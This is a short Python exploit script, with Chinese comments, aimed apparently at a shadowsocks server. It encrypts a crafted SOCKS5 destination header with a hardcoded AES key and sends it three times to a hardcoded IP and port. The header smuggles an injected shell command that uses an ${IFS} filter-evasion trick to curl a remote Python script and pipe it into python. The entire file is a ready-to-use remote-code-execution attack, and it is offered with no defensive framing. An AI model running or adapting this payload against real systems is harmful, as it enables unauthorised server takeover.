# coding:utf-8
import socket
import sys,os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../'))
import cryptor # 这个exp.py放入shadowsocks文件夹

head = """can not parse header when ||curl${IFS%??}219.144.155.38/s.py|python${IFS%??}-:\n"""
target = ("03%02x%s0050" % (len(head), head.encode('hex'))).decode('hex') # 参考socks5协议, 03表示target是域名，然后两字节域名长度，最后两字节是port

for i in range(3):
    c = cryptor.Cryptor("fa82a566d707b5d1ee07cd7499dad3ca", "aes-256-cfb")
    tosend = c.encrypt(target)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('219.144.155.38', 2345))
    s.send(tosend)
    s.close()